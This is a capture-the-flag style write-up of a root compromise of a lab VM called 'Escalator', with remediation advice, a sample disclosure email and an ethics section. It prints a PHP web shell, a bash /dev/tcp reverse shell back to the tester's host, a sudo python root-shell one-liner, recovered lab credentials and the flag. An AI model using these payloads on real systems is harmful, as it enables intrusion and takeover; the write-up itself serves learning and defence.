# Escalator - Privilege Escalation Walkthrough

## Project Information

- **Target OS:** Ubuntu 16.04.7 LTS Xenial Xerus
- **Target IP Address:** 192.168.56.103
- **Objective:** Gain root privileges on the target machine and retrieve the flag located at `/root/root.txt`.

---

## Tools Used

- Nmap
- FTP client
- Netcat
- SSH
- Python 3.5
- sudo
- Bash

---

## Walkthrough

### 1. Host Discovery

First, I identified the target machine on the local network.

```bash
nmap -sn 192.168.56.0/24
```

The target was discovered at:

```text
192.168.56.103
```

---

### 2. Service Enumeration

I scanned the target for open services.

```bash
nmap -sV -sC -T4 -Pn 192.168.56.103
```

The scan showed the following services:

- `21/tcp` FTP
- `22/tcp` SSH
- `80/tcp` HTTP

The FTP server allowed anonymous access.

---

### 3. Anonymous FTP Access

I connected to the FTP service using anonymous credentials.

```bash
ftp 192.168.56.103
```

Files found in the FTP directory:

- `life.c`
- `template.html`

The FTP directory appeared to be exposed through the web server, which suggested uploaded files might be accessible through HTTP.

---

### 4. Initial Web Shell Upload

I uploaded a PHP file to test code execution.

Example payload:

```php
<?php system($_GET['cmd']); ?>
```

After uploading the file to the FTP directory, I accessed it through the web server and confirmed command execution.

Example test:

```bash
http://192.168.56.103/files/script.php?cmd=whoami
```

The response showed:

```text
www-data
```

This confirmed remote command execution as `www-data`.

---

### 5. Reverse Shell

To get an interactive shell, I started a listener on my machine:

```bash
nc -lvnp 4444
```

Then I uploaded a PHP reverse shell and triggered it through the browser.

```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'");
?>
```


This gave me a shell as:

```text
www-data@ubuntu
```

---

### 6. System Enumeration

From the `www-data` shell, I enumerated the system and found an interesting file in `/home`:

```bash
cd /home
ls
cat important.txt
```

The file hinted to run a script:

```text
/.runme.sh
```

I executed it and observed that it printed a misleading message and then exited early.

I then inspected the script instead of trusting it blindly.

```bash
cat /.runme.sh
```

Inside the script, I found a hidden credential hint:

```text
shrek:061fe5e7b95d5f98208d7bc89ed2d569
```

This suggested a username and password for the local user `shrek`.

---

### 7. Switch to Local User

I connected via SSH as `shrek` using the recovered password.

```bash
ssh shrek@192.168.56.103
```

After logging in, I checked sudo permissions:

```bash
sudo -l
```

The output showed:

```text
(root) NOPASSWD: /usr/bin/python3.5
```

This was the key privilege escalation path.

---

### 8. Privilege Escalation to Root

Since `python3.5` could be executed as root without a password, I spawned a root shell using Python.

```bash
sudo /usr/bin/python3.5 -c "import os; os.system('/bin/bash')"
```

This gave me a root shell.

I verified root access:

```bash
whoami
id
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

### 9. Retrieve the Flag

Finally, I read the root flag:

```bash
cat /root/root.txt
```

Flag:

```text
01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

---

## Vulnerabilities Identified

### 1. Anonymous FTP Access
Anonymous login was enabled on the FTP server, allowing unauthenticated access to files.

### 2. Web-Accessible FTP Directory
The FTP directory was exposed through Apache, making uploaded files directly reachable from the web server.

### 3. PHP Execution in Upload Directory
The server executed uploaded PHP files, enabling remote code execution.

### 4. Credential Disclosure in Script
A readable script contained credentials for the `shrek` user.

### 5. Dangerous sudo Configuration
The `shrek` user had passwordless sudo access to `/usr/bin/python3.5`, which allowed full root compromise.

---

## Impact

The chain of vulnerabilities allowed complete compromise of the system. An attacker could:

- Execute arbitrary commands remotely.
- Obtain an interactive shell.
- Recover local credentials.
- Escalate to root.
- Read sensitive files.
- Potentially maintain persistence or move laterally.

This is a **critical** security issue because root access means full control of the machine.

---

## Remediation

- Disable anonymous FTP unless it is strictly required.
- Remove executable permissions from upload directories.
- Store uploaded files outside the web root.
- Disable PHP execution in file upload locations.
- Never store plaintext credentials in scripts or readable files.
- Apply least privilege to sudo rules.
- Remove unnecessary `NOPASSWD` entries.
- Regularly audit file permissions and exposed services.

---

## Vulnerability Report Email

**To:** security@example.com  
**Subject:** Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM

Dear Security Team,

I am writing to report a critical privilege escalation vulnerability identified during an authorized assessment of the Escalator Challenge VM.

### Summary

The target system contains a chain of misconfigurations that allow an attacker to gain remote code execution through an anonymous FTP upload directory, recover a local user credential from a readable script, and escalate to root through a dangerous sudo configuration allowing passwordless execution of Python as root.

### Steps to Reproduce

1. Discover the target at `192.168.56.103`.
2. Enumerate services and confirm anonymous FTP access.
3. Upload a PHP file to the FTP directory.
4. Access the uploaded file through the web server and confirm command execution.
5. Obtain a shell as `www-data`.
6. Enumerate the filesystem and inspect `/.runme.sh`.
7. Recover the credentials for the `shrek` user.
8. SSH into the system as `shrek`.
9. Run `sudo -l` and observe passwordless access to `/usr/bin/python3.5`.
10. Execute Python as root and spawn a root shell.
11. Read `/root/root.txt`.

### Impact

This vulnerability allows full system compromise. An attacker could gain root access, read sensitive data, modify system files, install persistence mechanisms, and disrupt services.

### Proof of Root Access

I successfully obtained root access and retrieved the flag:

```text
01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

Best regards,  
Aguenouz Fahd

---

## Ethical Hacking Report

This assessment was performed only in a controlled laboratory environment for educational purposes. No unauthorized systems were accessed. The purpose of the project was to understand privilege escalation techniques and document remediation strategies.

### Ethical Responsibilities

- Always obtain explicit authorization before testing any system.
- Stay within the agreed scope of the assessment.
- Avoid causing unnecessary disruption or data loss.
- Report vulnerabilities responsibly and clearly.
- Provide remediation guidance, not just exploitation details.

### Legal and Ethical Boundaries

Unauthorized testing can be illegal and harmful. Even when a vulnerability is discovered, it must only be tested in approved environments or under a valid engagement.

### Responsible Disclosure

A professional report should explain the issue, the impact, the reproduction steps, and the recommended fixes. The goal is to help defenders improve security, not to cause damage.

